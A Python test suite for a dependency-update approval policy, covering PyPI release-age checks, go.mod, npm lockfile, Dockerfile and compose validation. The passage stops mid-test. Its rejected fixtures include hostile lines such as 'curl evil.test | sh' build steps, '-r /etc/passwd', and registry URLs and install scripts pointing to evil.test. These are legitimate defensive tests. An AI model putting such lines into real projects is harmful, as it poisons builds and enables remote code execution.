"""Dependency approval behavior and API transport regression tests."""
import importlib.util
import json
from pathlib import Path
import unittest
from unittest.mock import Mock, patch
import tempfile
import os
from datetime import datetime, timezone

SPEC = importlib.util.find_spec('dependency_updates')
if SPEC:
    from dependency_updates import policy, github, pipeline

SHA = 'a' * 40
BASE = 'b' * 40


class PythonReleaseAgeTests(unittest.TestCase):
    def setUp(self):
        spec = importlib.util.find_spec('dependency_updates.release_age')
        self.assertIsNotNone(spec, 'Python transitive artifact-age policy is missing')
        from dependency_updates import release_age
        self.age = release_age
        self.cutoff = '2026-10-05T00:00:00Z'

    def lock(self, version, hashes=('a' * 64,)):
        lines = '\n'.join('    --hash=sha256:' + value + (' \\' if i + 1 < len(hashes) else '')
                          for i, value in enumerate(hashes))
        return policy.UV_HEADER + 'botocore==' + version + ' \\\n' + lines + '\n    # via boto3\n'

    def release(self, version='1.43.108', timestamp='2026-10-02T12:00:00Z', digest='a' * 64):
        return {'info': {'name': 'botocore', 'version': version},
                'urls': [{'digests': {'sha256': digest}, 'upload_time_iso_8601': timestamp,
                          'yanked': False}]}

    def verify(self, metadata, after=None):
        reads = []
        def fetch(name, version):
            reads.append((name, version))
            return metadata
        evidence = self.age.verify_python_release_age(self.lock('1.43.107'),
                                                     after or self.lock('1.43.108'),
                                                     self.cutoff, fetch)
        self.assertEqual(reads, [('botocore', '1.43.108')])
        return evidence

    def test_cutoff_is_exact_168_hours_and_timezone_independent(self):
        self.assertEqual(self.age.release_cutoff(datetime(2026, 10, 12, tzinfo=timezone.utc)), self.cutoff)

    def test_mature_hashes_produce_deterministic_evidence(self):
        evidence = self.verify(self.release())
        self.assertEqual(evidence, self.verify(self.release()))
        self.assertEqual(evidence, [{'name': 'botocore', 'version': '1.43.108',
                                    'artifacts': [{'sha256': 'a' * 64, 'uploaded': '2026-10-02T12:00:00Z'}]}])

    def test_immature_transitive_is_refused_despite_old_enough_direct(self):
        with self.assertRaisesRegex(policy.Refused, 'seven-day'):
            self.age.verify_python_release_age(self.lock('1.43.108'), self.lock('1.43.111'), self.cutoff,
                                              lambda *_: self.release('1.43.111', '2026-10-09T12:00:00Z'))

    def test_recent_extra_wheel_on_an_old_release_is_refused_by_hash(self):
        metadata = self.release()
        metadata['urls'].append(self.release(timestamp='2026-10-09T12:00:00Z', digest='b' * 64)['urls'][0])
        with self.assertRaisesRegex(policy.Refused, 'seven-day'):
            self.verify(metadata, self.lock('1.43.108', ('a' * 64, 'b' * 64)))

    def test_unknown_yanked_missing_or_ambiguous_metadata_is_refused(self):
        invalid = []
        for key, value in [('yanked', True), ('upload_time_iso_8601', None),
                           ('upload_time_iso_8601', '2026-10-02'),
                           ('digests', {'sha256': 'b' * 64})]:
            metadata = self.release()
            metadata['urls'][0][key] = value
            invalid.append(metadata)
        for info in [{'name': 'another', 'version': '1.43.108'},
                     {'name': 'botocore', 'version': '1.43.111'}]:
            invalid.append({**self.release(), 'info': info})
        invalid.extend([{}, {'info': self.release()['info'], 'urls': []}])
        for metadata in invalid:
            with self.subTest(metadata=metadata), self.assertRaises(policy.Refused):
                self.verify(metadata)

    def test_unchanged_and_removed_packages_need_no_new_release_requests(self):
        fetch = Mock(side_effect=AssertionError('Unexpected release metadata read'))
        original = self.lock('1.43.108')
        self.assertEqual(self.age.verify_python_release_age(original, original, self.cutoff, fetch), [])
        fetch.assert_not_called()

    def test_hash_only_change_is_still_age_checked(self):
        with self.assertRaises(policy.Refused):
            self.age.verify_python_release_age(self.lock('1.43.108'), self.lock('1.43.108', ('b' * 64,)),
                                              self.cutoff, lambda *_: self.release())

    def test_public_metadata_transport_is_bounded_and_never_follows_redirects(self):
        from urllib.error import HTTPError
        for failure in (TimeoutError(), HTTPError('https://pypi.org', 302, 'redirect', {}, None),
                        ValueError('Invalid JSON')):
            with self.subTest(failure=type(failure).__name__):
                transport = Mock(side_effect=failure)
                with self.assertRaises(policy.Refused):
                    self.age.PyPI(transport=transport).release('botocore', '1.43.108')
                transport.assert_called_once()
        for name, version in (('../private', '1.0'), ('botocore', '1/../../private'),
                              ('https://internal', '1.0'), ('botocore', '')):
            transport = Mock(side_effect=AssertionError('Unvalidated metadata target'))
            with self.subTest(name=name, version=version), self.assertRaises(policy.Refused):
                self.age.PyPI(transport=transport).release(name, version)
            transport.assert_not_called()

    def test_changed_package_and_artifact_inventory_limits_fail_closed(self):
        metadata = self.release()
        metadata['urls'] *= 5001
        with self.assertRaises(policy.Refused):
            self.verify(metadata)

    def test_strict_timezone_timestamps_and_duplicate_artifacts_fail_closed(self):
        for timestamp in ['2026-10-02T12:00:00', '2026-10-02T12:00:00+00:00junk',
                          '2026-02-30T12:00:00Z', '2026-10-02T12:00:00+00:60',
                          123, '2026-10-05T00:00:00.000001Z']:
            with self.subTest(timestamp=timestamp), self.assertRaises(policy.Refused):
                self.verify(self.release(timestamp=timestamp))
        metadata = self.release()
        metadata['urls'] *= 2
        with self.assertRaises(policy.Refused):
            self.verify(metadata)

    def test_cutoff_accepts_timezone_but_refuses_naive_inputs(self):
        from datetime import timedelta
        tokyo = timezone(timedelta(hours=9))
        self.assertEqual(self.age.release_cutoff(datetime(2026, 10, 12, 9, tzinfo=tokyo)), self.cutoff)
        with self.assertRaises(policy.Refused):
            self.age.release_cutoff(datetime(2026, 10, 12))

    def test_removed_package_and_removed_hash_do_not_introduce_artifacts(self):
        before = self.lock('1.43.108', ('a' * 64, 'b' * 64))
        fetch = Mock(side_effect=AssertionError('No introduced artifacts'))
        self.assertEqual(self.age.verify_python_release_age(before, self.lock('1.43.108'), self.cutoff, fetch), [])

    def test_boundary_and_offset_timestamp_are_compared_in_utc(self):
        evidence = self.verify(self.release(timestamp='2026-10-05T09:00:00+09:00'))
        self.assertEqual(evidence[0]['artifacts'][0]['uploaded'], self.cutoff)


# Public data captured from the actual Go Bot PR #24; no candidate code runs.
GO_BOT24_BEFORE = """module github.com/enjoydarts/sifto/api

go 1.24.0

require (
	github.com/go-chi/chi/v5 v5.2.5
	github.com/golang-jwt/jwt/v5 v5.3.1
	github.com/inngest/inngestgo v0.15.1
	github.com/jackc/pgx/v5 v5.8.0
	github.com/mmcdole/gofeed v1.3.0
	github.com/redis/go-redis/v9 v9.18.0
)

require (
	github.com/PuerkitoBio/goquery v1.8.0 // indirect
	github.com/andybalholm/cascadia v1.3.1 // indirect
	github.com/cespare/xxhash/v2 v2.3.0 // indirect
	github.com/coder/websocket v1.8.12 // indirect
	github.com/dgryski/go-rendezvous v0.0.0-20200823014737-9f7001d12a5f // indirect
	github.com/fatih/structs v1.1.0 // indirect
	github.com/getsentry/sentry-go v0.36.2 // indirect
	github.com/google/uuid v1.6.0 // indirect
	github.com/gosimple/slug v1.12.0 // indirect
	github.com/gosimple/unidecode v1.0.1 // indirect
	github.com/gowebpki/jcs v1.0.0 // indirect
	github.com/hashicorp/errwrap v1.1.0 // indirect
	github.com/hashicorp/go-multierror v1.1.1 // indirect
	github.com/inngest/inngest v1.13.5 // indirect
	github.com/jackc/pgpassfile v1.0.0 // indirect
	github.com/jackc/pgservicefile v0.0.0-20240606120523-5a60cdf6a761 // indirect
	github.com/jackc/puddle/v2 v2.2.2 // indirect
	github.com/json-iterator/go v1.1.12 // indirect
	github.com/mmcdole/goxpp v1.1.1-0.20240225020742-a0c311522b23 // indirect
	github.com/modern-go/concurrent v0.0.0-20180306012644-bacd9c7ef1dd // indirect
	github.com/modern-go/reflect2 v1.0.2 // indirect
	github.com/oklog/ulid/v2 v2.1.1 // indirect
	github.com/pbnjay/memory v0.0.0-20210728143218-7b4eea64cf58 // indirect
	github.com/xhit/go-str2duration/v2 v2.1.0 // indirect
	go.uber.org/atomic v1.11.0 // indirect
	golang.org/x/net v0.41.0 // indirect
	golang.org/x/sync v0.17.0 // indirect
	golang.org/x/sys v0.36.0 // indirect
	golang.org/x/text v0.29.0 // indirect
	google.golang.org/genproto/googleapis/rpc v0.0.0-20250603155806-513f23925822 // indirect
	google.golang.org/grpc v1.73.0 // indirect
	google.golang.org/protobuf v1.36.6 // indirect
)
"""
GO_BOT24_AFTER = """module github.com/enjoydarts/sifto/api

go 1.25.9

require (
	github.com/getsentry/sentry-go v0.36.2
	github.com/go-chi/chi/v5 v5.3.2
	github.com/golang-jwt/jwt/v5 v5.3.1
	github.com/google/uuid v1.6.0
	github.com/inngest/inngest v1.19.3
	github.com/inngest/inngestgo v0.16.5
	github.com/jackc/pgx/v5 v5.11.0
	github.com/mmcdole/gofeed v1.5.0
	github.com/redis/go-redis/v9 v9.22.0
)

require (
	github.com/PuerkitoBio/goquery v1.8.0 // indirect
	github.com/andybalholm/cascadia v1.3.1 // indirect
	github.com/cespare/xxhash/v2 v2.3.0 // indirect
	github.com/coder/websocket v1.8.12 // indirect
	github.com/dgryski/go-rendezvous v0.0.0-20200823014737-9f7001d12a5f // indirect
	github.com/fatih/structs v1.1.0 // indirect
	github.com/gosimple/slug v1.12.0 // indirect
	github.com/gosimple/unidecode v1.0.1 // indirect
	github.com/gowebpki/jcs v1.0.0 // indirect
	github.com/hashicorp/errwrap v1.1.0 // indirect
	github.com/hashicorp/go-multierror v1.1.1 // indirect
	github.com/jackc/pgpassfile v1.0.0 // indirect
	github.com/jackc/pgservicefile v0.0.0-20240606120523-5a60cdf6a761 // indirect
	github.com/jackc/puddle/v2 v2.2.2 // indirect
	github.com/json-iterator/go v1.1.12 // indirect
	github.com/lmittmann/tint v1.1.0 // indirect
	github.com/mmcdole/goxpp v1.1.1-0.20240225020742-a0c311522b23 // indirect
	github.com/mmcdole/goxpp/v2 v2.0.0 // indirect
	github.com/modern-go/concurrent v0.0.0-20180306012644-bacd9c7ef1dd // indirect
	github.com/modern-go/reflect2 v1.0.2 // indirect
	github.com/oklog/ulid/v2 v2.1.1 // indirect
	github.com/pbnjay/memory v0.0.0-20210728143218-7b4eea64cf58 // indirect
	github.com/xhit/go-str2duration/v2 v2.1.0 // indirect
	go.uber.org/atomic v1.11.0 // indirect
	golang.org/x/net v0.58.0 // indirect
	golang.org/x/sync v0.22.0 // indirect
	golang.org/x/sys v0.47.0 // indirect
	golang.org/x/text v0.41.0 // indirect
	google.golang.org/genproto/googleapis/rpc v0.0.0-20260414002931-afd174a4e478 // indirect
	google.golang.org/grpc v1.82.1 // indirect
	google.golang.org/protobuf v1.36.11 // indirect
)
"""


class FakeClock:
    def __init__(self):
        self.elapsed = 0

    def monotonic(self):
        return self.elapsed

    def sleep(self, seconds):
        self.elapsed += seconds


class PolicyTests(unittest.TestCase):
    def setUp(self):
        self.assertIsNotNone(SPEC, 'approval automation must be implemented')

    def test_real_go_bot24_tidy_graph_and_go_language_update_are_supported(self):
        policy.validate_change('api/go.mod', GO_BOT24_BEFORE, GO_BOT24_AFTER)

    def test_go_indirect_addition_removal_and_existing_promotion_are_supported(self):
        original = 'module example.com/app\ngo 1.24.0\nrequire example.com/direct v1.2.3\nrequire example.com/transitive v0.1.0 // indirect\n'
        for candidate in [original + 'require example.com/new/v2 v2.1.0 // indirect\n',
                          original.replace('require example.com/transitive v0.1.0 // indirect\n', ''),
                          original.replace('v0.1.0 // indirect', 'v0.2.0'),
                          original.replace('go 1.24.0', 'go 1.99.0')]:
            with self.subTest(candidate=candidate):
                policy.validate_change('api/go.mod', original, candidate)

    def test_go_module_direct_identity_and_directive_metadata_are_fixed(self):
        original = 'module example.com/app\ngo 1.24.0\nrequire example.com/direct v1.2.3\n'
        candidates = [original.replace('example.com/app', 'example.com/other'),
                      original.replace('example.com/direct v1.2.3', 'example.com/direct/v2 v2.0.0'),
                      original + 'require example.com/new v1.0.0\n',
                      original.replace('require example.com/direct v1.2.3\n', ''),
                      original.replace('v1.2.3', 'v1.2.4 // indirect'),
                      original.replace('go 1.24.0', 'go 1.23.9'),
                      original.replace('go 1.24.0', 'go 2.0.0'),
                      original.replace('go 1.24.0', 'go 1.24.1 // metadata'),
                      original + 'toolchain go1.25.9\n',
                      original + 'replace example.com/direct => ./local\n',
                      original + 'exclude example.com/direct v1.2.3\n',
                      original + 'retract v1.2.3\n',
                      original + 'tool example.com/tool\n',
                      original + '// unrelated metadata\n']
        for candidate in candidates:
            with self.subTest(candidate=candidate):
                with self.assertRaises(policy.Refused):
                    policy.validate_change('api/go.mod', original, candidate)

    def test_go_patch_update_is_non_decreasing_and_numeric(self):
        original = 'module example.com/app\ngo 1.24.2\nrequire example.com/direct v1.2.3\n'
        policy.validate_change('api/go.mod', original, original.replace('go 1.24.2', 'go 1.24.10'))
        policy.validate_change('api/go.mod', original, original.replace('go 1.24.2', 'go 1.25'))
        for version in ('1.24.1', '1.23.99', '1.024.2', '1.24.02', '1.25rc1', 'latest'):
            with self.subTest(version=version), self.assertRaises(policy.Refused):
                policy.validate_change('api/go.mod', original, original.replace('go 1.24.2', 'go ' + version))

    def test_go_duplicate_directives_modules_and_malformed_require_blocks_are_refused(self):
        original = 'module example.com/app\ngo 1.24.0\nrequire example.com/direct v1.2.3\n'
        candidates = [original + 'module example.com/app\n', original + 'go 1.24.1\n',
                      original + 'require example.com/direct v1.2.4 // indirect\n',
                      original.replace('require example.com/direct v1.2.3', 'require (\nexample.com/direct v1.2.4'),
                      original + ')\n', original + 'require (\nrequire (\n)\n)\n',
                      original + 'require ()\n', original.replace('go 1.24.0\n', ''),
                      original.replace('module example.com/app\n', ''),
                      original.replace('v1.2.3', 'v1.2.4 // indirect extra')]
        for candidate in candidates:
            with self.subTest(candidate=candidate), self.assertRaises(policy.Refused):
                policy.validate_change('api/go.mod', original, candidate)

    def test_go_module_paths_and_versions_are_public_canonical_data(self):
        original = 'module example.com/app\ngo 1.24.0\nrequire example.com/direct v1.2.3\n'
        for path in ('../local', '/tmp/module', 'https://example.com/dep', 'example.com/a/../b',
                     'example.com//dep', 'example.com/.dep', 'example.com/dep.', 'localhost/dep',
                     'Example.com/dep', 'example.com/CON/dep', 'example.com/dep/v01', 'example.com/dep/v1',
                     'example.com/dep@v1', 'example.com/dep;id', 'example.com/dep\\name'):
            with self.subTest(path=path), self.assertRaises(policy.Refused):
                policy.validate_change('api/go.mod', original, original + 'require ' + path + ' v1.0.0 // indirect\n')
        for version in ('1.0.0', 'v1.2', 'v01.2.3', 'v1.02.3', 'v1.2.3-01', 'v1.2.3+metadata',
                        'v1.2.3;id', 'latest', 'https://example.com/version'):
            with self.subTest(version=version), self.assertRaises(policy.Refused):
                policy.validate_change('api/go.mod', original, original.replace('v1.2.3', version))

    def test_go_pseudoversions_major_suffixes_and_legacy_incompatible_are_supported(self):
        original = 'module example.com/app\ngo 1.24.0\nrequire example.com/direct v1.2.3\n'
        for dependency in ('github.com/UpperCase/module v0.0.0-20240606120523-5a60cdf6a761',
                           'example.com/dep/v2 v2.1.0', 'gopkg.in/yaml.v3 v3.0.1',
                           'example.com/legacy v2.0.0+incompatible'):
            with self.subTest(dependency=dependency):
                policy.validate_change('api/go.mod', original, original + 'require ' + dependency + ' // indirect\n')
        for dependency in ('example.com/dep/v2 v1.0.0', 'example.com/dep v2.1.0',
                           'gopkg.in/yaml.v3 v2.1.0', 'example.com/dep v1.0.0+incompatible',
                           'example.com/EXAMPL~1.COM v1.0.0', '127.0.0.1/dep v1.0.0'):
            with self.subTest(dependency=dependency), self.assertRaises(policy.Refused):
                policy.validate_change('api/go.mod', original, original + 'require ' + dependency + ' // indirect\n')

    def test_image_security_compose_pin_is_ci_only_and_other_configuration_is_fixed(self):
        path = 'infra/image-security/compose.yml'
        original = 'services:\n  verifier:\n    image: python:3.12.15-slim\n    network_mode: none\n    read_only: true\n    cap_drop: [ALL]\n    volumes: [./tool:/tool:ro]\n'
        pinned = original.replace('python:3.12.15-slim', 'python:3.12.15-slim@sha256:' + 'a' * 64)
        policy.validate_change(path, original, pinned)
        self.assertEqual(policy.surfaces([path]), ['ci'])
        for candidate in (pinned.replace('network_mode: none', 'network_mode: host'),
                          pinned.replace('read_only: true', 'read_only: false'),
                          pinned.replace('cap_drop: [ALL]', 'cap_drop: []'),
                          pinned.replace('./tool:/tool:ro', '/etc:/tool:ro'),
                          pinned + '    environment: {TOKEN: fixture}\n'):
            with self.subTest(candidate=candidate), self.assertRaises(policy.Refused):
                policy.validate_change(path, original, candidate)
        for unsupported in ('infra/image-security/other.yml', 'infra/image-security/secrets.yml'):
            with self.assertRaises(policy.Refused):
                policy.validate_change(unsupported, original, pinned)
            with self.assertRaises(policy.Refused):
                policy.surfaces([unsupported])

    def test_renovate_npm_compose_pin_is_ci_only_and_runtime_configuration_is_fixed(self):
        path = 'infra/dependency-ci/compose.renovate-npm.yml'
        original = 'services:\n  test:\n    image: node:22.23.3-alpine\n    user: "1000:1000"\n    network_mode: none\n    read_only: true\n    cap_drop: [ALL]\n    security_opt: [no-new-privileges:true]\n    volumes: [./tool:/tool:ro]\n'
        pinned = original.replace('node:22.23.3-alpine', 'node:22.23.3-alpine@sha256:' + 'b' * 64)
        policy.validate_change(path, original, pinned)
        self.assertEqual(policy.surfaces([path]), ['ci'])
        for candidate in (pinned + '    environment: {TOKEN: fixture}\n',
                          pinned.replace('./tool:/tool:ro', '/etc:/tool:rw'),
                          pinned.replace('user: "1000:1000"', 'user: "0:0"'),
                          pinned.replace('read_only: true', 'read_only: false'),
                          pinned.replace('cap_drop: [ALL]', 'cap_drop: []'),
                          pinned.replace('no-new-privileges:true', 'no-new-privileges:false'),
                          pinned.replace('network_mode: none', 'network_mode: host')):
            with self.subTest(candidate=candidate), self.assertRaises(policy.Refused):
                policy.validate_change(path, original, candidate)
        with self.assertRaises(policy.Refused):
            policy.validate_change('infra/dependency-ci/compose.renovate-npm-other.yml', original, pinned)

    def test_versions_are_allowed_but_requirement_commands_are_rejected(self):
        policy.validate_change('worker/requirements.in', 'httpx==0.28.1\n', 'httpx==0.29.0\n')
        for candidate in ['-r /etc/passwd\n', 'httpx @ https://evil.test/a.whl\n', 'httpx==0.29.0\n--index-url=https://evil.test\n']:
            with self.assertRaises(policy.Refused):
                policy.validate_change('worker/requirements.in', 'httpx==0.28.1\n', candidate)

    def test_hashed_uv_locks_allow_transitive_changes_with_bounded_summary(self):
        original = (Path('/repository') / 'worker/requirements.txt').read_text()
        updated = original.replace('anyio==4.15.1', 'anyio==4.15.2')
        policy.validate_change('worker/requirements.txt', original, updated)
        self.assertEqual(policy.python_lock(original)['anyio']['version'], '4.15.1')
        summary = policy.python_lock_summary(original, updated)
        self.assertIn('anyio: 4.15.1 -> 4.15.2', '\n'.join(summary))
        self.assertLess(len('\n'.join(summary)), 2000)
        smaller = original[:original.index('annotated-types==')] + original[original.index('anthropic=='):]
        policy.validate_change('worker/requirements.txt', original, smaller)

    def test_uv_locks_refuse_commands_duplicate_pins_missing_hashes_and_bad_metadata(self):
        header = '# This file was autogenerated by uv via the following command:\n#    uv pip compile --python-version=3.12 --universal --generate-hashes --output-file=requirements.txt requirements.in\n'
        pin = 'httpx==0.28.1 \\\n    --hash=sha256:' + 'a' * 64 + '\n    # via -r requirements.in\n'
        valid = header + pin
        for invalid in [valid.replace('--python-version=3.12', '--python-version=3.13'), valid + pin, header + 'httpx==0.28.1\n', valid.replace('sha256:', 'md5:'), valid + '--index-url https://evil.test\n', valid + '# arbitrary command\n', valid.replace('# via -r requirements.in', '# via https://evil.test'), valid.replace('httpx==0.28.1', "httpx==0.28.1 ; unknown == 'x'"), valid.replace('a' * 64, 'a' * 63)]:
            with self.subTest(invalid=invalid[-100:]):
                with self.assertRaises(policy.Refused):
                    policy.validate_change('worker/requirements.txt', valid, invalid)
        with self.assertRaises(policy.Refused):
            policy.validate_change('worker/requirements.in', 'httpx==0.28.1\n', 'httpx==0.29.0\nhttpx==0.29.0\n')

    def test_python_inputs_and_lock_ci_images_classify_and_executor_stays_separate(self):
        self.assertEqual(policy.surfaces(['worker/requirements.in', 'infra/audio-concat/requirements.in', 'infra/dependency-ci/compose.python-locks.yml']), ['audio', 'ci', 'worker'])
        for path in ['infra/maintenance/requirements.in', 'infra/maintenance/requirements.txt']:
            with self.assertRaises(policy.Refused):
                policy.surfaces([path])

    def test_scripts_and_manifest_metadata_cannot_change(self):
        original = {'dependencies': {'next': '^16.2.6'}, 'scripts': {'build': 'next build'}}
        candidate = json.loads(json.dumps(original))
        candidate['dependencies']['next'] = '^16.2.7'
        policy.validate_change('web/package.json', json.dumps(original), json.dumps(candidate))
        candidate['scripts']['build'] = 'curl evil.test | sh'
        with self.assertRaises(policy.Refused):
            policy.validate_change('web/package.json', json.dumps(original), json.dumps(candidate))

    def test_lockfile_cannot_change_scripts_or_transport_without_a_version_update(self):
        original = {'lockfileVersion': 3, 'packages': {'': {'dependencies': {'dep': '^1.0.0'}}, 'node_modules/dep': {'version': '1.0.0', 'hasInstallScript': False}}}
        candidate = json.loads(json.dumps(original))
        candidate['packages']['node_modules/dep']['hasInstallScript'] = True
        with self.assertRaises(policy.Refused):
            policy.validate_change('web/package-lock.json', json.dumps(original), json.dumps(candidate))
        candidate['packages']['node_modules/dep']['resolved'] = 'https://evil.test/a.tgz'
        with self.assertRaises(policy.Refused):
            policy.validate_change('web/package-lock.json', json.dumps(original), json.dumps(candidate))

    def test_npm12_generated_peer_bundle_and_workspace_metadata_are_supported(self):
        original = {'lockfileVersion': 3, 'packages': {'': {'dependencies': {'dep': '^1.0.0'}},
                    'node_modules/dep': {'version': '1.0.0'}}}
        candidate = json.loads(json.dumps(original))
        candidate['packages']['node_modules/dep'] = {
            'version': '1.0.1', 'peer': True, 'workspaces': ['docs', 'benchmarks'],
            'bundleDependencies': ['@emnapi/core', 'tslib'],
            'dependencies': {'@emnapi/core': '^1.0.0', 'tslib': '^2.0.0'}}
        policy.validate_change('web/package-lock.json', json.dumps(original), json.dumps(candidate))

    def test_npm12_metadata_cannot_introduce_scripts_links_or_unsafe_paths(self):
        original = {'lockfileVersion': 3, 'packages': {'': {'dependencies': {'dep': '^1.0.0'}},
                    'node_modules/dep': {'version': '1.0.0'}}}
        mutations = [
            {'peer': 'true'}, {'peer': 1}, {'scripts': {'install': 'evil'}}, {'link': True},
            {'workspaces': '../outside'}, {'workspaces': ['../outside']}, {'workspaces': ['/tmp']},
            {'workspaces': ['https://evil.test']}, {'workspaces': ['docs\\outside']},
            {'workspaces': ['docs', 'docs']}, {'workspaces': [None]}, {'workspaces': ['a/../b']},
            {'workspaces': ['docs\n']}, {'workspaces': ['docs'] * 129},
            {'workspaces': ['.']}, {'workspaces': ['..']}, {'workspaces': []},
            {'workspaces': ['packages/*']}, {'workspaces': ['%2e%2e/outside']},
            {'bundleDependencies': True}, {'bundleDependencies': ['not-declared']},
            {'bundleDependencies': ['tslib', 'tslib'], 'dependencies': {'tslib': '^2.0.0'}},
            {'bundleDependencies': ['file:evil']}, {'bundleDependencies': ['../evil']},
            {'bundleDependencies': [None]}, {'bundleDependencies': ['tslib'] * 257},
            {'bundleDependencies': ['tslib'], 'dependencies': ['tslib']},
            {'bundleDependencies': ['tslib'], 'optionalDependencies': 'tslib'},
            {'unknown': True}, {'resolved': 'https://evil.test/dep.tgz'},
        ]
        for mutation in mutations:
            candidate = json.loads(json.dumps(original))
            candidate['packages']['node_modules/dep'].update({'version': '1.0.1', **mutation})
            with self.subTest(mutation=mutation), self.assertRaises(policy.Refused):
                policy.validate_change('web/package-lock.json', json.dumps(original), json.dumps(candidate))

    def test_install_can_complete_missing_registry_integrity_pair_for_same_version(self):
        original = {'lockfileVersion': 3, 'packages': {'': {'dependencies': {'argparse': '^2.0.1'}},
                    'node_modules/argparse': {'version': '2.0.1', 'dev': True, 'license': 'Python-2.0'}}}
        candidate = json.loads(json.dumps(original))
        candidate['packages']['node_modules/argparse'].update({
            'resolved': 'https://registry.npmjs.org/argparse/-/argparse-2.0.1.tgz',
            'integrity': 'sha512-8+9WqebbFzpX9OR+Wa6O29asIogeRMzcGtAINdpMHHyAg10f05aSFVBbcEqGf/PXw1EjAZ+q2/bEBg3DvurK3Q=='})
        policy.validate_change('web/package-lock.json', json.dumps(original), json.dumps(candidate))
        for field, value in [('resolved', 'https://registry.npmjs.org/other/-/other-2.0.1.tgz'),
                             ('resolved', 'https://registry.npmjs.org/argparse/-/argparse-2.0.2.tgz'),
                             ('integrity', 'md5-invalid'), ('hasInstallScript', True), ('peer', True)]:
            invalid = json.loads(json.dumps(candidate))
            invalid['packages']['node_modules/argparse'][field] = value
            with self.subTest(field=field, value=value), self.assertRaises(policy.Refused):
                policy.validate_change('web/package-lock.json', json.dumps(original), json.dumps(invalid))
        for field in ('resolved', 'integrity'):
            incomplete = json.loads(json.dumps(candidate))
            del incomplete['packages']['node_modules/argparse'][field]
            with self.subTest(incomplete=field), self.assertRaises(policy.Refused):
                policy.validate_change('web/package-lock.json', json.dumps(original), json.dumps(incomplete))
        for field in ('resolved', 'integrity', 'hasInstallScript', 'workspaces'):
            changed = json.loads(json.dumps(candidate))
            changed['packages']['node_modules/argparse'][field] = {
                'resolved': 'https://registry.npmjs.org/other/-/other-2.0.1.tgz',
                'integrity': 'sha512-' + 'A' * 88, 'hasInstallScript': True, 'workspaces': ['docs']}[field]
            with self.subTest(existing=field), self.assertRaises(policy.Refused):
                policy.validate_change('web/package-lock.json', json.dumps(candidate), json.dumps(changed))

    def test_registry_pair_completion_requires_canonical_scoped_path_and_hash(self):
        integrity = 'sha512-8+9WqebbFzpX9OR+Wa6O29asIogeRMzcGtAINdpMHHyAg10f05aSFVBbcEqGf/PXw1EjAZ+q2/bEBg3DvurK3Q=='
        for path, name in [('node_modules/@scope/pkg', '@scope/pkg'),
                           ('node_modules/parent/node_modules/pkg', 'pkg'),
                           ('node_modules/@node_modules/pkg', '@node_modules/pkg')]:
            original = {'lockfileVersion': 3, 'packages': {'': {}, path: {'version': '1.0.0'}}}
            candidate = json.loads(json.dumps(original))
            candidate['packages'][path].update({
                'resolved': 'https://registry.npmjs.org/' + name + '/-/' + name.rsplit('/', 1)[-1] + '-1.0.0.tgz',
                'integrity': integrity})
            with self.subTest(path=path):
                policy.validate_change('web/package-lock.json', json.dumps(original), json.dumps(candidate))
            for raw in ['sha512-YQ==', integrity[:-3] + 'R==', integrity.rstrip('='), 'sha256-' + 'A' * 44]:
                invalid = json.loads(json.dumps(candidate))
                invalid['packages'][path]['integrity'] = raw
                with self.subTest(path=path, integrity=raw), self.assertRaises(policy.Refused):
                    policy.validate_change('web/package-lock.json', json.dumps(original), json.dumps(invalid))
            for present in [{'resolved': None}, {'integrity': None}, {'resolved': ''}, {'integrity': ''},
                            {'resolved': candidate['packages'][path]['resolved']}, {'integrity': integrity}]:
                incomplete_before = json.loads(json.dumps(original))
                incomplete_before['packages'][path].update(present)
                with self.subTest(path=path, partial=present), self.assertRaises(policy.Refused):
                    policy.validate_change('web/package-lock.json', json.dumps(incomplete_before), json.dumps(candidate))
            removed = json.loads(json.dumps(candidate))
            del removed['packages'][path]['integrity']
            with self.subTest(path=path, removed=True), self.assertRaises(policy.Refused):
                policy.validate_change('web/package-lock.json', json.dumps(candidate), json.dumps(removed))
        original = {'lockfileVersion': 3, 'packages': {'': {}, 'node_modules/pkg': {'version': '^1.0.0'}}}
        candidate = json.loads(json.dumps(original))
        candidate['packages']['node_modules/pkg'].update({
            'resolved': 'https://registry.npmjs.org/pkg/-/pkg-^1.0.0.tgz', 'integrity': integrity})
        with self.assertRaises(policy.Refused):
            policy.validate_change('web/package-lock.json', json.dumps(original), json.dumps(candidate))

    def test_registry_completion_requires_canonical_fixed_semver(self):
        for version in ['1.0.0-rc.1', '1.0.0+build.01', '1.0.0-1a.0+build',
                        '1.0.0-01', '1.0.0-a..b', '1.0.0-.', '1.0.0+.', '01.0.0', '~1.0.0']:
            original = {'lockfileVersion': 3, 'packages': {'': {}, 'node_modules/pkg': {'version': version}}}
            candidate = json.loads(json.dumps(original))
            candidate['packages']['node_modules/pkg'].update({
                'resolved': 'https://registry.npmjs.org/pkg/-/pkg-' + version + '.tgz',
                'integrity': 'sha512-8+9WqebbFzpX9OR+Wa6O29asIogeRMzcGtAINdpMHHyAg10f05aSFVBbcEqGf/PXw1EjAZ+q2/bEBg3DvurK3Q=='})
            with self.subTest(version=version):
                if version in ['1.0.0-rc.1', '1.0.0+build.01', '1.0.0-1a.0+build']:
                    policy.validate_change('web/package-lock.json', json.dumps(original), json.dumps(candidate))
                else:
                    with self.assertRaises(policy.Refused):
                        policy.validate_change('web/package-lock.json', json.dumps(original), json.dumps(candidate))

    def test_ambiguous_duplicate_manifest_keys_are_refused(self):
        original = '{"scripts":{},"dependencies":{"dep":"1.0.0"}}'
        candidate = '{"scripts":{"install":"evil"},"scripts":{},"dependencies":{"dep":"1.0.1"}}'
        with self.assertRaises(policy.Refused):
            policy.validate_change('web/package.json', original, candidate)

    def test_docker_images_only_and_existing_air_version(self):
        original = 'FROM python:3.12-slim\nRUN echo safe\n'
        policy.validate_change('worker/Dockerfile', original, original.replace('3.12', '3.13'))
        with self.assertRaises(policy.Refused):
            policy.validate_change('worker/Dockerfile', original, original.replace('echo safe', 'curl evil.test | sh'))
        with self.assertRaises(policy.Refused):
            policy.validate_change('worker/Dockerfile', original, original.replace('python:', 'evil/runner:'))
        original = 'RUN go install github.com/air-verse/air@v1.67.4\n'
        policy.validate_change('api/Dockerfile', original, original.replace('1.67.4', '1.67.5'))

    def test_compose_environment_mount_and_permissions_are_rejected(self):
        original = 'services:\n  redis:\n    image: redis:7-alpine\n    environment: {FOO: bar}\n'
        policy.validate_change('docker-compose.yml', original, original.replace('redis:7', 'redis:8'))
        for candidate in [original.replace('bar', 'evil'), original + '    privileged: true\n', original + '    volumes: [/etc:/host]\n']:
            with self.assertRaises(policy.Refused):
                policy.validate_change('docker-compose.yml', original, candidate)

    def test_postgres_mount_fixture_image_pin_is_ci_only_and_commands_are_fixed(self):
